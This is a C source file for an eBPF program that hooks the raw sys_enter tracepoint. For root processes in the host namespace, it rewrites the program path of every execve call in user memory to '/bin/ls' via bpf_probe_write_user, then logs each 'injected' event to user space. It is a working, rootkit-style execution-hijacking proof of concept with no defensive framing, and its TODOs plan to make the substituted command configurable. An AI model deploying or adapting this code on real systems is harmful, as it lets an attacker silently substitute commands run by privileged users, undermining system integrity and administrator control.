//go:build ignore
#include "vmlinux.h"
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include "common.h"
#include "execve.h"

#define MAX_PATH_LEN 32

char LICENSE[] SEC("license") = "GPL";

struct event {
    u32 pid;
    char pathname[128];
    u32 len_pathname;
    bool injected;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 24);
    __type(value, struct event);
} events SEC(".maps");

// returns 0 if really handled
static __inline int handle_enter_execve(struct bpf_raw_tracepoint_args *ctx) {
    // int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);

    // 1. init communication struct with user space
    struct event *e;
    e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) {
        return -1;
    }
    // 2. parse args
    struct execve_args args = {};
    if (parse_execve_args(ctx, &args) != 0) {
        bpf_ringbuf_discard(e, 0);
        return -1;
    }
    e->len_pathname = bpf_probe_read_user_str(e->pathname, MAX_PATH_LEN, args.pathname);
    if (e->len_pathname < 0){
        bpf_ringbuf_discard(e, 0);
        return -1;
    }
    // 3. overwrite pathname to /bin/whoami
    // TODO: overwrite args also
    bool injected;
    // TODO: read from user space
    const char new_path[] = "/bin/ls";
    // if (e->len_pathname < sizeof(new_path)) {
    //     return -1;
    // }
    // This may fail with errno 14, which means "Bad address"
    // But it still works, because execve will be called frequently
    long ret = bpf_probe_write_user((void *)args.pathname, new_path, sizeof(new_path));
    if (ret != 0) {
        bpf_printk("bpf_probe_write_user failed: %d\n", ret);
        bpf_ringbuf_discard(e, 0);
        return -1;
    }
    injected = true;
    // 4. send event to user space
    e->pid = bpf_get_current_pid_tgid() >> 32;
    e->injected = injected;
    bpf_ringbuf_submit(e, 0);
    return 0;
}

SEC("raw_tracepoint/sys_enter")
int raw_tracepoint(struct bpf_raw_tracepoint_args *ctx) {
    // filter uid==0
    if (!is_root()) {
        return 0;
    }
    // filter mnt_ns==[init]
    if (!is_host()) {
        return 0;
    }
    // filter syscall
    struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
    unsigned long syscall_id = ctx->args[1];
    switch (syscall_id) {
    // TODO: use __NR_execve instead of a magic number
    case 59:
        if (handle_enter_execve(ctx) != 0) {
            return 0;
        }
        break;
    case 322: // execveat
        bpf_printk("syscall_id=%d\n", syscall_id);
        break;
    default:
        return 0;
    }
    return 0;
}